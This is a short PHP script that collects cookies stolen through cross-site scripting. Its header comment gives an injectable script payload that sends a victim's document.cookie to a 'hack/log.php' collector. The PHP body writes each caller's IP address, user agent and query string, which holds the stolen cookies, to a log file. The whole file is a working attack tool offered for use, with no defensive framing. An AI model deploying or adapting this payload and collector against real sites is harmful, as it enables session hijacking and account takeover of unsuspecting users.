<?php
	// Use me as follow:
	//
	// Inject something like this into a XSS page
	//
	//  <script>
	//		var i = new Image();
	//		i.src="http://localhost/hack/log.php?cookie="+document.cookie;
	//	</script>

	$ip = $_SERVER['REMOTE_ADDR'];
	$browser = $_SERVER['HTTP_USER_AGENT'];

	$fp=fopen("log.txt", 'a');

	fwrite($fp, $ip . " " . $browser . ":\n");
	fwrite($fp, urlencode($_SERVER['QUERY_STRING']) . "\n\n");
	
	fclose($fp);
?>